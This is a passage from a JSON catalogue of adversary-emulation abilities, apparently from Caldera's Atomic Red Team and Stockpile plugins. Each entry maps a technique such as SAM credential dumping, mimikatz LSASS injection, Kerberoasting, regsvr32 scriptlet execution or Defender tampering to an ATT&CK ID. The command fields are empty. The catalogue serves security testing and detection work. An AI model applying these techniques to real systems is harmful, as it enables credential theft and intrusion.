        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "RDP to DomainController",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "28ed45c4da059b14a1b2d4f061b912b8",
        "technique_id": "T1021.001",
        "repeatable": false
    },
    {
        "description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Deployment Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Radmin Viewer Utility",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6aafc5f2ffba8d901f5c59233700944d",
        "technique_id": "T1072",
        "repeatable": false
    },
    {
        "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 \u00ebR?NTFS\n```",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Direct Volume Access",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Read volume boot sector via DOS device path (PowerShell)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "80e752c5fc69a56ccb86bc90efc5eff6",
        "technique_id": "T1006",
        "repeatable": false
    },
    {
        "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Automated Collection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Recon information for export with Command Prompt",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "7121cdf93b951311be9d7078c602efdc",
        "technique_id": "T1119",
        "repeatable": false
    },
    {
        "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Automated Collection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Recon information for export with PowerShell",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "344e7eaf650763e0d3e9f02e62c1cf4b",
        "technique_id": "T1119",
        "repeatable": false
    },
    {
        "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Reg Key Run",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5503b4931592d3d01840133599b87893",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Reg Key RunOnce",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "534ee0652aca292fc05421f6f429918b",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Regasm Uninstall Method Call Test",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d3ddb9ff73f1927990c8286b6bf796e7",
        "technique_id": "T1218.009",
        "repeatable": false
    },
    {
        "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Run Virtual Instance",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Register Portable Virtualbox",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "015623df4f8517d933e4edd65deb97ed",
        "technique_id": "T1564.006",
        "repeatable": false
    },
    {
        "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Register-CimProvider - Execute evil dll",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "123d761fda64a5dd8535ac0ab95d4f25",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Audio Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Registry artefact when application use microphone",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "372e6f46fca18e4f1b43209c20ffafa2",
        "technique_id": "T1123",
        "repeatable": false
    },
    {
        "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Video Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Registry artefact when application use webcam",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "da86001b5081fcf773d8e62f22cf2b00",
        "technique_id": "T1125",
        "repeatable": false
    },
    {
        "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: Security Account Manager",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Registry dump of SAM, creds, and secrets",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "7fa4ea18694f2552547b65e23952cabb",
        "technique_id": "T1003.002",
        "repeatable": false
    },
    {
        "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Application Shimming",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Registry key creation and/or modification events for SDB",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "ed65658e4431bc3b636dd0de29bf8e35",
        "technique_id": "T1546.011",
        "repeatable": false
    },
    {
        "description": "Parses registry hives to obtain stored credentials\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: Security Account Manager",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Registry parse with pypykatz",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "0a154631923cfdbf2bc717716a9b75d8",
        "technique_id": "T1003.002",
        "repeatable": false
    },
    {
        "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: COR_PROFILER",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Registry-free process scope COR_PROFILER",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6149b491c05b505e56aa8ec9ef9c357a",
        "technique_id": "T1574.012",
        "repeatable": false
    },
    {
        "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Regsvcs Uninstall Method Call Test",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "478df50001947bbbc38d109b90b1710e",
        "technique_id": "T1218.009",
        "repeatable": false
    },
    {
        "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Regsvr32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Regsvr32 Registering Non DLL",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "61af21e36eb366eb7321e2a43053eeb1",
        "technique_id": "T1218.010",
        "repeatable": false
    },
    {
        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Regsvr32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Regsvr32 Silent DLL Install Call DllRegisterServer",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6b79b62b7bc6508698502e822ed01c79",
        "technique_id": "T1218.010",
        "repeatable": false
    },
    {
        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Regsvr32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Regsvr32 local COM scriptlet execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d415783a94a4134fc3b5a99c531cbb74",
        "technique_id": "T1218.010",
        "repeatable": false
    },
    {
        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Regsvr32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Regsvr32 local DLL execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6f2d3770ffae12e3cbeb0c49d9a700ad",
        "technique_id": "T1218.010",
        "repeatable": false
    },
    {
        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Regsvr32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Regsvr32 remote COM scriptlet execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c9bea46c8cb460a401d5167e9ee3bfe2",
        "technique_id": "T1218.010",
        "repeatable": false
    },
    {
        "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: Windows Remote Management",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote Code Execution with PS Credentials Using Invoke-Command",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "7844eb9751d121b16f9517817a31eee4",
        "technique_id": "T1021.006",
        "repeatable": false
    },
    {
        "description": "Ping a remote host to see if it is accessible",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.not_exists"
            }
        ],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote Host Ping",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "921055f4-5970-4707-909e-62f594234d91",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote Process Injection in LSASS via mimikatz",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "b745ad6d82b54521c261f827005136e7",
        "technique_id": "T1055",
        "repeatable": false
    },
    {
        "description": "Download an executable from github and start it as a service on a remote endpoint\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create or Modify System Process: Windows Service",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote Service Installation CMD",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "004870c555d9397f779884031520700a",
        "technique_id": "T1543.003",
        "repeatable": false
    },
    {
        "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - adidnsdump",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "4fffde1941bd17fed24ac68fd5e354aa",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - arp",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "a44bb43474728496276d5d73aa14588f",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - net",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f3c05269abfec53a1ea9b6d75dcce176",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - net group Domain Computers",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "d8fedd81fc35099a5a3f1a8f5d2082dd",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Identify remote systems with net.exe querying the Active Directory Domain Controller.\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Controller\" in the domain. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - net group Domain Controller",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "6f56fb95b173768d748414faf2db6588",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - nltest",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "fcb5b04ee56a74c73f29b9eecb6d4b17",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - nslookup",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "13a0c78dbd8d3645db69540bfe7cd038",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - ping sweep",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "bf4dc95d64c15935ed1db8c98bb21133",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "RemotePC Software Execution",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "b200c52b097fd12b22b3203e0035e55d",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "This test will remove an account from the domain admins group\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Access Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remove Account From Domain Admin Group",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "3f71c3360964b1a8c81618eb963c05f9",
        "technique_id": "T1531",
        "repeatable": false
    },
    {
        "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, \u201cMissing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remove Administrative Shares",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "1b43591006b8e25b8df16ee52f0832bf",
        "technique_id": "T1070.005",
        "repeatable": false
    },
    {
        "description": "Removes a Network Share utilizing the command_prompt\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remove Network Share",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d7c027c49b9819c836e9533c8d96eaaa",
        "technique_id": "T1070.005",
        "repeatable": false
    },
    {
        "description": "Removes a Network Share utilizing PowerShell\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remove Network Share PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6940ffd670787cd1c410997e66629573",
        "technique_id": "T1070.005",
        "repeatable": false
    },
    {
        "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remove Windows Defender Definition Files",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "197a322f46033d8c1e5011967a0bce41",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Remove the Zone.Identifier alternate data stream",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7f0f5471543a6f188b0fbdc436c49fd9",
        "technique_id": "T1553.005",
        "repeatable": false
    },
    {
        "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "037e77f3c330580a9fce977cb308966b",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Defacement: Internal Defacement",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Replace Desktop Wallpaper",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "90adc98ddf396bb7cb3b90a1f090a0e0",
        "technique_id": "T1491.001",
        "repeatable": false
    },
    {
        "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create or Modify System Process: Windows Service",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.service.modifiable"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Replace a service binary with alternate binary",
        "tactic": "persistence",
        "plugin": "stockpile",
        "ability_id": "52771610-2322-44cf-816b-a7df42b4c086",
        "technique_id": "T1543.003",
        "repeatable": false
    },
    {
        "description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Accessibility Features",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Replace binary of sticky keys",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "84942e0bfed7ce40449941faec766c5e",
        "technique_id": "T1546.008",
        "repeatable": false
    },
    {
        "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Request A Single Ticket via PowerShell",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "91a18ae1efe4119a549cea2ac7de72c4",
        "technique_id": "T1558.003",
        "repeatable": false
    },
    {
        "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Request All Tickets via PowerShell",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "2f03250355bb1403dcfac6808782a192",
        "technique_id": "T1558.003",
        "repeatable": false
    },
    {
        "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Request for service tickets",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "8b5f748da9647a4d9c5a37f20124ba9c",
        "technique_id": "T1558.003",
        "repeatable": false
    },
    {
        "description": "This test restarts a Windows system.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Shutdown/Reboot",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Restart System - Windows",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "617ea9a1ca1df0d88fe31919dfbcdc90",
        "technique_id": "T1529",
        "repeatable": false
    },
    {
        "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "2cc37a6cf2f1acdeaa6a6638016444d1",
        "technique_id": "T1003",
        "repeatable": false
    },
    {
        "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
